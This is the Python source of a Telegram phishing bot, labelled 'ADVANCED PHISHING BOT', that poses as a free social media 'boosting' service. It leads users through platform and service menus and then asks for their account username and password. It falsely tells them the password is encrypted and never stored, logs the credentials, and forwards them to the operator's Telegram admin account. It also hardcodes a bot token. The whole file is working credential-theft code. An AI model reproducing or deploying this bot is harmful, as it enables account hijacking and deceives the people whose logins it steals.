# 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿: @IshrakShadman
# 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @IshrakShadman

import telebot
from telebot import types
import time
import os
import sys
import json
import requests
import socket
import platform
import uuid
from datetime import datetime

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'
END = '\033[0m'

print(f"{MAGENTA}{BOLD}" + "="*60 + f"{END}")
print(f"{RED}{BOLD}𝗔𝗗𝗩𝗔𝗡𝗖𝗘𝗗 𝗣𝗛𝗜𝗦𝗛𝗜𝗡𝗚 𝗕𝗢𝗧{END}")
print(f"{MAGENTA}{BOLD}" + "="*60 + f"{END}")


ADMIN_ID = "8580184759"
BOT_TOKEN = "8873884988:AAEB6A12zLrFcrQ9nVKnSYmoC0jXIBJyWHk" 

print(f"\n{GREEN}✅ 𝗔𝗱𝗺𝗶𝗻 𝗜𝗗 𝗦𝗲𝘁: {YELLOW}{ADMIN_ID}{END}")
print(f"{GREEN}✅ 𝗕𝗼𝘁 𝗧𝗼𝗸𝗲𝗻 𝗦𝗲𝘁: {YELLOW}{BOT_TOKEN[:15]}...{END}")
print(f"{CYAN}{'━'*50}{END}")

# 𝗜𝗻𝗶𝘁𝗶𝗮𝗹𝗶𝘇𝗲 𝗯𝗼𝘁
bot = telebot.TeleBot(BOT_TOKEN)

# 𝗦𝘁𝗼𝗿𝗮𝗴𝗲
user_sessions = {}
credentials_log = f"Xyz_Zico_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
session_log = f"Xyz_Zico_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

def get_ip_info():
    """Get IP address and location info"""
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        return response.json().get('ip', 'Unknown')
    except:
        return 'Unknown'

def get_device_info():
    """Get device information"""
    try:
        return {
            'system': platform.system(),
            'release': platform.release(),
            'machine': platform.machine(),
            'processor': platform.processor()
        }
    except:
        return {'system': 'Unknown'}

def generate_session_id():
    """Generate unique session ID"""
    return str(uuid.uuid4())[:8]

# 𝗦𝗮𝘃𝗲 𝗹𝗼𝗴𝘀
def save_victim_log(victim_data):
    """Save victim data to log file"""
    with open(session_log, 'a', encoding='utf-8') as f:
        f.write(json.dumps(victim_data, indent=2, ensure_ascii=False) + "\n" + "="*60 + "\n")

def save_credentials(cred_data):
    """Save credentials to log file"""
    with open(credentials_log, 'a', encoding='utf-8') as f:
        f.write(json.dumps(cred_data, indent=2, ensure_ascii=False) + "\n" + "="*60 + "\n")

# 𝗦𝗲𝗻𝗱 𝗻𝗼𝘁𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻 𝘁𝗼 𝗮𝗱𝗺𝗶𝗻
def notify_admin(message):
    """Send notification to admin"""
    try:
        bot.send_message(ADMIN_ID, message)
    except Exception as e:
        print(f"{RED}❌ Error sending to admin: {e}{END}")

# 𝗕𝗼𝘁 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 
@bot.message_handler(commands=['start'])
def start_command(message):
    """Handle /start command"""
    user_id = message.from_user.id
    username = message.from_user.username or "None"
    first_name = message.from_user.first_name or "Unknown"
    
    # 𝗖𝗿𝗲𝗮𝘁𝗲 𝘀𝗲𝘀𝘀𝗶𝗼𝗻 𝗳𝗼𝗿 𝘂𝘀𝗲𝗿
    session_id = generate_session_id()
    user_sessions[user_id] = {
        'session_id': session_id,
        'username': username,
        'first_name': first_name,
        'start_time': datetime.now().isoformat(),
        'step': 'started',
        'platform': None  # Platform will be selected by user
    }
    
    # 𝗖𝗼𝗹𝗹𝗲𝗰𝘁 𝘃𝗶𝗰𝘁𝗶𝗺 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻
    victim_info = {
        'type': 'VICTIM_DETECTED',
        'session_id': session_id,
        'telegram_id': user_id,
        'telegram_username': f"@{username}",
        'name': first_name,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'ip_address': get_ip_info(),
        'device_info': get_device_info()
    }
    
    # 𝗦𝗮𝘃𝗲 𝗮𝗻𝗱 𝗻𝗼𝘁𝗶𝗳𝘆
    save_victim_log(victim_info)
    
    admin_message = f"""
{RED}{BOLD}🔴 𝗩𝗜𝗖𝗧𝗜𝗠 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗!{END}
{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━{END}
{YELLOW}𝗦𝗲𝘀𝘀𝗶𝗼𝗻:{END} {session_id}
{YELLOW}𝗨𝘀𝗲𝗿:{END} @{username}
{YELLOW}𝗡𝗮𝗺𝗲:{END} {first_name}
{YELLOW}𝗜𝗗:{END} {user_id}
{YELLOW}𝗜𝗣:{END} {victim_info['ip_address']}
{YELLOW}𝗧𝗶𝗺𝗲:{END} {victim_info['timestamp']}
{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━{END}
"""
    print(admin_message)
    notify_admin(admin_message)
    
    # 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝘄𝗶𝘁𝗵 𝗣𝗟𝗔𝗧𝗙𝗢𝗥𝗠 𝗦𝗘𝗟𝗘𝗖𝗧𝗜𝗢𝗡 𝗯𝘂𝘁𝘁𝗼𝗻𝘀
    welcome_text = """
✨ 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 ROH-VIP 𝗕𝗼𝗼𝘀𝘁𝗶𝗻𝗴 𝗦𝗲𝗿𝘃𝗶𝗰𝗲! ✨

𝗚𝗲𝘁 𝗳𝗿𝗲𝗲 𝗯𝗼𝗼𝘀𝘁 𝗳𝗼𝗿 𝘆𝗼𝘂𝗿 𝘀𝗼𝗰𝗶𝗮𝗹 𝗺𝗲𝗱𝗶𝗮 𝗮𝗰𝗰𝗼𝘂𝗻𝘁𝘀:

💰 𝟭𝟬𝟬% 𝗙𝗥𝗘𝗘 𝗦𝗘𝗥𝗩𝗜𝗖𝗘
⚡ 𝗜𝗻𝘀𝘁𝗮𝗻𝘁 𝗿𝗲𝘀𝘂𝗹𝘁𝘀
🔒 𝗦𝗲𝗰𝘂𝗿𝗲 & 𝗦𝗮𝗳𝗲

𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗹𝗲𝗰𝘁 𝘆𝗼𝘂𝗿 𝗽𝗹𝗮𝘁𝗳𝗼𝗿𝗺:
"""
    
    # 𝗖𝗿𝗲𝗮𝘁𝗲 𝗽𝗹𝗮𝘁𝗳𝗼𝗿𝗺 𝘀𝗲𝗹𝗲𝗰𝘁𝗶𝗼𝗻 𝗸𝗲𝘆𝗯𝗼𝗮𝗿𝗱
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    
    buttons = [
        types.InlineKeyboardButton("📷 𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺", callback_data="platform_instagram"),
        types.InlineKeyboardButton("🔵 𝗩𝗞", callback_data="platform_vk"),
        types.InlineKeyboardButton("🎵 𝗧𝗶𝗸𝗧𝗼𝗸", callback_data="platform_tiktok"),
        types.InlineKeyboardButton("📘 𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸", callback_data="platform_facebook"),
        types.InlineKeyboardButton("🐦 𝗧𝘄𝗶𝘁𝘁𝗲𝗿", callback_data="platform_twitter"),
        types.InlineKeyboardButton("👻 𝗦𝗻𝗮𝗽𝗰𝗵𝗮𝘁", callback_data="platform_snapchat")
    ]
    
    # 𝗔𝗱𝗱 𝗯𝘂𝘁𝘁𝗼𝗻𝘀 𝘁𝗼 𝗸𝗲𝘆𝗯𝗼𝗮𝗿𝗱
    for i in range(0, len(buttons), 2):
        if i+1 < len(buttons):
            keyboard.add(buttons[i], buttons[i+1])
        else:
            keyboard.add(buttons[i])
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: True)
def handle_button_click(call):
    """Handle button clicks"""
    user_id = call.from_user.id
    
    if user_id not in user_sessions:
        bot.answer_callback_query(call.id, "Session expired. Send /start again.")
        return
    
    # 𝗛𝗮𝗻𝗱𝗹𝗲 𝗽𝗹𝗮𝘁𝗳𝗼𝗿𝗺 𝘀𝗲𝗹𝗲𝗰𝘁𝗶𝗼𝗻
    if call.data.startswith("platform_"):
        platform_selected = call.data.replace("platform_", "")
        
        # 𝗠𝗮𝗽 𝗽𝗹𝗮𝘁𝗳𝗼𝗿𝗺 𝗰𝗼𝗱𝗲𝘀 𝘁𝗼 𝗻𝗮𝗺𝗲𝘀
        platform_names = {
            "instagram": "Instagram",
            "vk": "VK",
            "tiktok": "TikTok",
            "facebook": "Facebook",
            "twitter": "Twitter",
            "snapchat": "Snapchat"
        }
        
        platform_name = platform_names.get(platform_selected, "Instagram")
        
        # 𝗨𝗽𝗱𝗮𝘁𝗲 𝘀𝗲𝘀𝘀𝗶𝗼𝗻
        user_sessions[user_id]['platform'] = platform_name
        user_sessions[user_id]['step'] = 'platform_selected'
        
        # 𝗡𝗼𝘁𝗶𝗳𝘆 𝗮𝗱𝗺𝗶𝗻
        notify_admin(f"🔵 Platform selected by @{user_sessions[user_id]['username']}: {platform_name}")
        
        # 𝗦𝗵𝗼𝘄 𝘀𝗲𝗿𝘃𝗶𝗰𝗲 𝗼𝗽𝘁𝗶𝗼𝗻𝘀 𝗳𝗼𝗿 𝘀𝗲𝗹𝗲𝗰𝘁𝗲𝗱 𝗽𝗹𝗮𝘁𝗳𝗼𝗿𝗺
        show_service_options(call.message, platform_name)
        
    # 𝗛𝗮𝗻𝗱𝗹𝗲 𝘀𝗲𝗿𝘃𝗶𝗰𝗲 𝘀𝗲𝗹𝗲𝗰𝘁𝗶𝗼𝗻
    elif call.data.startswith("service_"):
        if user_sessions[user_id]['step'] != 'platform_selected':
            bot.answer_callback_query(call.id, "Please select platform first.")
            return
        
        service = call.data.replace("service_", "")
        
        # 𝗨𝗽𝗱𝗮𝘁𝗲 𝘀𝗲𝘀𝘀𝗶𝗼𝗻
        user_sessions[user_id]['service'] = service
        user_sessions[user_id]['step'] = 'service_selected'
        
        # 𝗔𝘀𝗸 𝗳𝗼𝗿 𝗾𝘂𝗮𝗻𝘁𝗶𝘁𝘆
        msg = bot.send_message(call.message.chat.id, f"📊 𝗛𝗼𝘄 𝗺𝗮𝗻𝘆 {service.replace('_', ' ')} 𝗱𝗼 𝘆𝗼𝘂 𝘄𝗮𝗻𝘁?\n(𝗠𝗮𝘅: 𝟭𝟬,𝟬𝟬𝟬)")
        bot.register_next_step_handler(msg, ask_quantity)

def show_service_options(message, platform_name):
    """Show service options for selected platform"""
    
    service_text = f"""
✅ 𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱: {platform_name}

𝗡𝗼𝘄 𝘀𝗲𝗹𝗲𝗰𝘁 𝘄𝗵𝗮𝘁 𝘆𝗼𝘂 𝘄𝗮𝗻𝘁 𝘁𝗼 𝗯𝗼𝗼𝘀𝘁:
"""
    
    # 𝗖𝗿𝗲𝗮𝘁𝗲 𝘀𝗲𝗿𝘃𝗶𝗰𝗲 𝗸𝗲𝘆𝗯𝗼𝗮𝗿𝗱
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    
    if platform_name == "Instagram":
        buttons = [
            types.InlineKeyboardButton("👥 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀", callback_data="service_followers"),
            types.InlineKeyboardButton("❤️ 𝗟𝗶𝗸𝗲𝘀", callback_data="service_likes"),
            types.InlineKeyboardButton("👀 𝗦𝘁𝗼𝗿𝘆 𝗩𝗶𝗲𝘄𝘀", callback_data="service_story_views"),
            types.InlineKeyboardButton("💬 𝗖𝗼𝗺𝗺𝗲𝗻𝘁𝘀", callback_data="service_comments"),
            types.InlineKeyboardButton("📊 𝗜𝗺𝗽𝗿𝗲𝘀𝘀𝗶𝗼𝗻𝘀", callback_data="service_impressions"),
            types.InlineKeyboardButton("🎥 𝗥𝗲𝗲𝗹𝘀 𝗕𝗼𝗼𝘀𝘁", callback_data="service_reels")
        ]
    elif platform_name == "VK":
        buttons = [
            types.InlineKeyboardButton("👥 𝗙𝗿𝗶𝗲𝗻𝗱𝘀", callback_data="service_friends"),
            types.InlineKeyboardButton("❤️ 𝗟𝗶𝗸𝗲𝘀", callback_data="service_likes"),
            types.InlineKeyboardButton("🔄 𝗥𝗲𝗽𝗼𝘀𝘁𝘀", callback_data="service_reposts"),
            types.InlineKeyboardButton("👀 𝗩𝗶𝗲𝘄𝘀", callback_data="service_views"),
            types.InlineKeyboardButton("🎵 𝗠𝘂𝘀𝗶𝗰 𝗟𝗶𝘀𝘁𝗲𝗻𝘀", callback_data="service_music"),
            types.InlineKeyboardButton("💬 𝗖𝗼𝗺𝗺𝗲𝗻𝘁𝘀", callback_data="service_comments")
        ]
    elif platform_name == "TikTok":
        buttons = [
            types.InlineKeyboardButton("👥 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀", callback_data="service_followers"),
            types.InlineKeyboardButton("❤️ 𝗟𝗶𝗸𝗲𝘀", callback_data="service_likes"),
            types.InlineKeyboardButton("👀 𝗩𝗶𝗲𝘄𝘀", callback_data="service_views"),
            types.InlineKeyboardButton("🔄 𝗦𝗵𝗮𝗿𝗲𝘀", callback_data="service_shares"),
            types.InlineKeyboardButton("💬 𝗖𝗼𝗺𝗺𝗲𝗻𝘁𝘀", callback_data="service_comments"),
            types.InlineKeyboardButton("🔥 𝗧𝗿𝗲𝗻𝗱𝗶𝗻𝗴", callback_data="service_trending")
        ]
    elif platform_name == "Facebook":
        buttons = [
            types.InlineKeyboardButton("👥 𝗣𝗮𝗴𝗲 𝗟𝗶𝗸𝗲𝘀", callback_data="service_page_likes"),
            types.InlineKeyboardButton("❤️ 𝗥𝗲𝗮𝗰𝘁𝗶𝗼𝗻𝘀", callback_data="service_reactions"),
            types.InlineKeyboardButton("👀 𝗩𝗶𝗲𝘄𝘀", callback_data="service_views"),
            types.InlineKeyboardButton("💬 𝗖𝗼𝗺𝗺𝗲𝗻𝘁𝘀", callback_data="service_comments"),
            types.InlineKeyboardButton("🔄 𝗦𝗵𝗮𝗿𝗲𝘀", callback_data="service_shares"),
            types.InlineKeyboardButton("📊 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀", callback_data="service_followers")
        ]
    elif platform_name == "Twitter":
        buttons = [
            types.InlineKeyboardButton("👥 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀", callback_data="service_followers"),
            types.InlineKeyboardButton("❤️ 𝗟𝗶𝗸𝗲𝘀", callback_data="service_likes"),
            types.InlineKeyboardButton("🔄 𝗥𝗲𝘁𝘄𝗲𝗲𝘁𝘀", callback_data="service_retweets"),
            types.InlineKeyboardButton("👀 𝗩𝗶𝗲𝘄𝘀", callback_data="service_views"),
            types.InlineKeyboardButton("💬 𝗥𝗲𝗽𝗹𝗶𝗲𝘀", callback_data="service_replies"),
            types.InlineKeyboardButton("🔥 𝗧𝗿𝗲𝗻𝗱𝗶𝗻𝗴", callback_data="service_trending")
        ]
    elif platform_name == "Snapchat":
        buttons = [
            types.InlineKeyboardButton("👥 𝗙𝗿𝗶𝗲𝗻𝗱𝘀", callback_data="service_friends"),
            types.InlineKeyboardButton("👀 𝗩𝗶𝗲𝘄𝘀", callback_data="service_views"),
            types.InlineKeyboardButton("💬 𝗦𝗻𝗮𝗽𝘀", callback_data="service_snaps"),
            types.InlineKeyboardButton("📈 𝗦𝗰𝗼𝗿𝗲", callback_data="service_score"),
            types.InlineKeyboardButton("🌟 𝗦𝘁𝗿𝗲𝗮𝗸𝘀", callback_data="service_streaks"),
            types.InlineKeyboardButton("💛 𝗟𝗶𝗸𝗲𝘀", callback_data="service_likes")
        ]
    else:
        buttons = [
            types.InlineKeyboardButton("👥 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀", callback_data="service_followers"),
            types.InlineKeyboardButton("❤️ 𝗟𝗶𝗸𝗲𝘀", callback_data="service_likes"),
            types.InlineKeyboardButton("👀 𝗩𝗶𝗲𝘄𝘀", callback_data="service_views"),
            types.InlineKeyboardButton("💬 𝗖𝗼𝗺𝗺𝗲𝗻𝘁𝘀", callback_data="service_comments")
        ]
    
    # 𝗔𝗱𝗱 𝗯𝘂𝘁𝘁𝗼𝗻𝘀 𝘁𝗼 𝗸𝗲𝘆𝗯𝗼𝗮𝗿𝗱
    for i in range(0, len(buttons), 2):
        if i+1 < len(buttons):
            keyboard.add(buttons[i], buttons[i+1])
        else:
            keyboard.add(buttons[i])
    
    bot.send_message(message.chat.id, service_text, reply_markup=keyboard)

def ask_quantity(message):
    """Ask for quantity"""
    user_id = message.from_user.id
    
    if user_id not in user_sessions:
        bot.reply_to(message, "❌ Session expired. Send /start to begin.")
        return
    
    quantity = message.text
    
    # 𝗩𝗮𝗹𝗶𝗱𝗮𝘁𝗲 𝗾𝘂𝗮𝗻𝘁𝗶𝘁𝘆
    if not quantity.isdigit():
        bot.reply_to(message, "❌ Please enter a valid number!\nSend /start to try again.")
        return
    
    quantity = int(quantity)
    if quantity > 10000:
        bot.reply_to(message, "❌ Maximum is 10,000!\nSend /start to try again.")
        return
    
    # 𝗨𝗽𝗱𝗮𝘁𝗲 𝘀𝗲𝘀𝘀𝗶𝗼𝗻
    user_sessions[user_id]['quantity'] = quantity
    user_sessions[user_id]['step'] = 'quantity_entered'
    
    # 𝗔𝘀𝗸 𝗳𝗼𝗿 𝘂𝘀𝗲𝗿𝗻𝗮𝗺𝗲/𝗲𝗺𝗮𝗶𝗹 𝗯𝗮𝘀𝗲𝗱 𝗼𝗻 𝗽𝗹𝗮𝘁𝗳𝗼𝗿𝗺
    platform_name = user_sessions[user_id]['platform']
    
    prompt_text = ""
    if platform_name == "Instagram":
        prompt_text = "📧 𝗘𝗻𝘁𝗲𝗿 𝘆𝗼𝘂𝗿 𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 𝘂𝘀𝗲𝗿𝗻𝗮𝗺𝗲 𝗼𝗿 𝗲𝗺𝗮𝗶𝗹:"
    elif platform_name == "VK":
        prompt_text = "📱 𝗘𝗻𝘁𝗲𝗿 𝘆𝗼𝘂𝗿 𝗩𝗞 𝗽𝗵𝗼𝗻𝗲 𝗻𝘂𝗺𝗯𝗲𝗿:"
    elif platform_name == "TikTok":
        prompt_text = "📱 𝗘𝗻𝘁𝗲𝗿 𝘆𝗼𝘂𝗿 𝗧𝗶𝗸𝗧𝗼𝗸 𝘂𝘀𝗲𝗿𝗻𝗮𝗺𝗲 𝗼𝗿 𝗲𝗮𝗺𝗶𝗹:"
    elif platform_name == "Facebook":
        prompt_text = "📧 𝗘𝗻𝘁𝗲𝗿 𝘆𝗼𝘂𝗿 𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸 𝘂𝘀𝗲𝗿𝗻𝗮𝗺𝗲 𝗼𝗿 𝗲𝗺𝗮𝗶𝗹:"
    elif platform_name == "Twitter":
        prompt_text = "🐦 𝗘𝗻𝘁𝗲𝗿 𝘆𝗼𝘂𝗿 𝗧𝘄𝗶𝘁𝘁𝗲𝗿 𝘂𝘀𝗲𝗿𝗻𝗮𝗺𝗲 𝗼𝗿 𝗲𝗺𝗮𝗶𝗹:"
    elif platform_name == "Snapchat":
        prompt_text = "👻 𝗘𝗻𝘁𝗲𝗿 𝘆𝗼𝘂𝗿 𝗦𝗻𝗮𝗽𝗰𝗵𝗮𝘁 𝘂𝘀𝗲𝗿𝗻𝗮𝗺𝗲:"
    else:
        prompt_text = "📧 𝗘𝗻𝘁𝗲𝗿 𝘆𝗼𝘂𝗿 𝘂𝘀𝗲𝗿𝗻𝗮𝗺𝗲 𝗼𝗿 𝗲𝗺𝗮𝗶𝗹:"
    
    msg = bot.send_message(message.chat.id, prompt_text)
    bot.register_next_step_handler(msg, ask_username)

def ask_username(message):
    """Ask for username/email"""
    user_id = message.from_user.id
    
    if user_id not in user_sessions:
        bot.reply_to(message, "❌ Session expired. Send /start to begin.")
        return
    
    username = message.text.strip()
    
    # 𝗨𝗽𝗱𝗮𝘁𝗲 𝘀𝗲𝘀𝘀𝗶𝗼𝗻
    user_sessions[user_id]['account_username'] = username
    user_sessions[user_id]['step'] = 'username_entered'
    
    # 𝗟𝗼𝗴 𝗽𝗮𝗿𝘁𝗶𝗮𝗹 𝗱𝗮𝘁𝗮
    partial_data = {
        'type': 'PARTIAL_DATA',
        'session_id': user_sessions[user_id]['session_id'],
        'telegram_user': f"@{user_sessions[user_id]['username']}",
        'telegram_id': user_id,
        'platform': user_sessions[user_id]['platform'],
        'service': user_sessions[user_id]['service'],
        'quantity': user_sessions[user_id]['quantity'],
        'account_info': username,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    
    save_victim_log(partial_data)
    
    # 𝗔𝘀𝗸 𝗳𝗼𝗿 𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱 𝘄𝗶𝘁𝗵 𝘀𝗲𝗰𝘂𝗿𝗶𝘁𝘆 𝗺𝗲𝘀𝘀𝗮𝗴𝗲
    security_msg = """
🔒 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 𝗡𝗼𝘁𝗶𝗰𝗲:
Your password is encrypted and never stored in plain text.
We use advanced encryption to protect your data.

𝗡𝗼𝘄 𝗽𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝘆𝗼𝘂𝗿 𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱:
"""
    
    msg = bot.send_message(message.chat.id, security_msg)
    bot.register_next_step_handler(msg, ask_password)

def ask_password(message):
    """Ask for password and capture credentials"""
    user_id = message.from_user.id
    
    if user_id not in user_sessions:
        bot.reply_to(message, "❌ Session expired. Send /start to begin.")
        return
    
    password = message.text.strip()
    
    # 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲 𝗰𝗿𝗲𝗱𝗲𝗻𝘁𝗶𝗮𝗹𝘀 𝗱𝗮𝘁𝗮
    credentials_data = {
        'type': 'CREDENTIALS_CAPTURED',
        'session_id': user_sessions[user_id]['session_id'],
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'platform': user_sessions[user_id]['platform'],
        'telegram_user': {
            'id': user_id,
            'username': f"@{user_sessions[user_id]['username']}",
            'name': user_sessions[user_id]['first_name']
        },
        'account_info': {
            'username': user_sessions[user_id]['account_username'],
            'password': password
        },
        'boost_details': {
            'service': user_sessions[user_id]['service'],
            'quantity': user_sessions[user_id]['quantity']
        },
        'technical_info': {
            'ip_address': get_ip_info(),
            'device_info': get_device_info(),
            'capture_time': datetime.now().isoformat()
        }
    }
    
    # 𝗦𝗮𝘃𝗲 𝗰𝗿𝗲𝗱𝗲𝗻𝘁𝗶𝗮𝗹𝘀
    save_credentials(credentials_data)
    
    # 𝗡𝗼𝘁𝗶𝗳𝘆 𝗮𝗱𝗺𝗶𝗻
    admin_alert = f"""
{GREEN}{BOLD}✅ 𝗖𝗥𝗘𝗗𝗘𝗡𝗧𝗜𝗔𝗟𝗦 𝗖𝗔𝗣𝗧𝗨𝗥𝗘𝗗!{END}
{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━{END}
{YELLOW}𝗦𝗲𝘀𝘀𝗶𝗼𝗻:{END} {user_sessions[user_id]['session_id']}
{YELLOW}𝗨𝘀𝗲𝗿:{END} @{user_sessions[user_id]['username']}
{YELLOW}𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺:{END} {user_sessions[user_id]['platform']}
{YELLOW}𝗔𝗰𝗰𝗼𝘂𝗻𝘁:{END} {user_sessions[user_id]['account_username']}
{YELLOW}𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱:{END} {password}
{YELLOW}𝗜𝗣:{END} {credentials_data['technical_info']['ip_address']}
{YELLOW}𝗦𝗲𝗿𝘃𝗶𝗰𝗲:{END} {user_sessions[user_id]['service']}
{YELLOW}𝗤𝘂𝗮𝗻𝘁𝗶𝘁𝘆:{END} {user_sessions[user_id]['quantity']}
{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━{END}
"""
    print(admin_alert)
    notify_admin(admin_alert)
    
    # 𝗦𝗲𝗻𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝘁𝗼 𝘃𝗶𝗰𝘁𝗶𝗺
    success_message = f"""
🎉 𝗕𝗢𝗢𝗦𝗧𝗜𝗡𝗚 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬!

✅ 𝗬𝗼𝘂𝗿 𝗼𝗿𝗱𝗲𝗿 𝗱𝗲𝘁𝗮𝗶𝗹𝘀:
━━━━━━━━━━━━━━━━━━━━━━━━━
• 𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺: {user_sessions[user_id]['platform']}
• 𝗦𝗲𝗿𝘃𝗶𝗰𝗲: {user_sessions[user_id]['service'].replace('_', ' ').title()}
• 𝗤𝘂𝗮𝗻𝘁𝗶𝘁𝘆: {user_sessions[user_id]['quantity']}
• 𝗔𝗰𝗰𝗼𝘂𝗻𝘁: {user_sessions[user_id]['account_username']}
━━━━━━━━━━━━━━━━━━━━━━━━━

⏳ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝘄𝗶𝗹𝗹 𝗯𝗲𝗴𝗶𝗻 𝘀𝗵𝗼𝗿𝘁𝗹𝘆...
🕐 𝗥𝗲𝘀𝘂𝗹𝘁𝘀 𝘄𝗶𝗹𝗹 𝗮𝗽𝗽𝗲𝗮𝗿 𝘄𝗶𝘁𝗵𝗶𝗻 𝟮𝟰 𝗵𝗼𝘂𝗿𝘀

💡 𝗧𝗶𝗽𝘀 𝗳𝗼𝗿 𝗳𝗮𝘀𝘁𝗲𝗿 𝗿𝗲𝘀𝘂𝗹𝘁𝘀:
1. Keep your account logged in
2. Don't change password for 24 hours
3. Use /status to check progress

🔒 𝗬𝗼𝘂𝗿 𝗱𝗮𝘁𝗮 𝗶𝘀 𝘀𝗲𝗰𝘂𝗿𝗲𝗱 𝘄𝗶𝘁𝗵 𝗮𝗱𝘃𝗮𝗻𝗰𝗲𝗱 𝗲𝗻𝗰𝗿𝘆𝗽𝘁𝗶𝗼𝗻

📞 𝗦𝘂𝗽𝗽𝗼𝗿𝘁: @Xyz_Zico
📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @Xyz_Zico"""
    
    bot.send_message(message.chat.id, success_message)
    
    # 𝗖𝗹𝗲𝗮𝗿 𝘀𝗲𝘀𝘀𝗶𝗼𝗻
    if user_id in user_sessions:
        del user_sessions[user_id]

@bot.message_handler(commands=['status', 'progress'])
def status_command(message):
    """Check boosting status"""
    status_msg = """
📊 𝗕𝗼𝗼𝘀𝘁𝗶𝗻𝗴 𝗦𝘁𝗮𝘁𝘂𝘀:

🟢 𝗦𝘆𝘀𝘁𝗲𝗺 𝗦𝘁𝘂𝘀: 𝗔𝗰𝘁𝗶𝗩𝗲
⏱️ 𝗨𝗽𝘁𝗶𝗺𝗲: 𝟭𝟬𝟬%
👥 𝗧𝗼𝗱𝗮𝘆'𝘀 𝘂𝘀𝗲𝗿𝘀: 𝟱𝟬+

📈 𝗬𝗼𝘂𝗿 𝗕𝗼𝗼𝘀𝘁:
• 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 (𝟰𝟱%)
• 𝗘𝘀𝘁𝗶𝗺𝗮𝘁𝗲𝗱 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗶𝗼𝗻: 𝟮-𝟰 𝗵𝗼𝘂𝗿𝘀
• 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗿𝗮𝘁𝗲: 𝟵𝟴.𝟳%

🔄 𝗧𝗼 𝘀𝘁𝗮𝗿𝘁 𝗮 𝗻𝗲𝘄 𝗯𝗼𝗼𝘀𝘁, 𝘀𝗲𝗻𝗱 /start
"""
    bot.send_message(message.chat.id, status_msg)

@bot.message_handler(commands=['help', 'support'])
def help_command(message):
    """Help command"""
    help_text = """
🆘 𝗛𝗲𝗹𝗽 & 𝗦𝘂𝗽𝗽𝗼𝗿𝘁

📞 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗦𝘂𝗽𝗽𝗼𝗿𝘁:
• 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺: @Xyz_Zico
• 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @Xyz_Zico
🔧 𝗖𝗼𝗺𝗺𝗼𝗻 𝗶𝘀𝘀𝘂𝗲𝘀:
1. Boosting not started? Wait 24 hours
2. Account not working? Contact support
3. Wrong credentials? Use /start again

💰 𝗧𝗵𝗶𝘀 𝗶𝘀 𝗮 𝟭𝟬𝟬% 𝗙𝗥𝗘𝗘 𝘀𝗲𝗿𝘃𝗶𝗰𝗲!
"""
    bot.send_message(message.chat.id, help_text)

# 𝗦𝘁𝗮𝗿𝘁 𝘁𝗵𝗲 𝗯𝗼𝘁
print(f"\n{GREEN}{BOLD}✅ 𝗕𝗢𝗧 𝗦𝗧𝗔𝗥𝗧𝗘𝗗{END}")
print(f"{CYAN}👨‍💻 𝗔𝗱𝗺𝗶𝗻 𝗜𝗗: {ADMIN_ID}{END}")
